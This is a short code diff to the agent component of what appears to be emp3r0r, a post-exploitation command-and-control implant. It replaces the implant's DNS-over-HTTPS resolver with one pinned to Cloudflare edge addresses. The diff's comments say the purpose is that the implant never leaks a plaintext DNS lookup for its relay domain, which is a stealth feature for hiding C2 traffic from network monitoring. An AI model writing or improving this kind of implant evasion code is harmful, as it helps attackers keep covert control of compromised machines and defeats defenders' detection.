@@ -22,7 +22,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
-	"github.com/ncruces/go-dns"
 )
 
 const (
@@ -114,12 +113,12 @@ func agent_main() {
 
 	// DNS
 	if common.RuntimeConfig.DoHServer != "" {
-		// use DoH resolver. Bootstrap (resolving the DoH server's own hostname)
-		// can fail when the DoH host is dead/burned; degrade to the system
-		// resolver instead of panicking later on a nil DefaultResolver.
-		if resolver, dnsErr := dns.NewDoHResolver(
+		// use DoH resolver, pinned to CF anycast edges so even the bootstrap
+		// never leaks a plaintext system-DNS query for the relay domain.
+		// Degrade to the system resolver instead of panicking later on a nil
+		// DefaultResolver.
+		if resolver, dnsErr := c2transport.NewPinnedDoHResolver(
 			common.RuntimeConfig.DoHServer,
-			dns.DoHCache(),
 		); dnsErr != nil || resolver == nil {
 			logging.Warningf("DoH bootstrap failed (%v), falling back to system DNS", dnsErr)
 		} else {
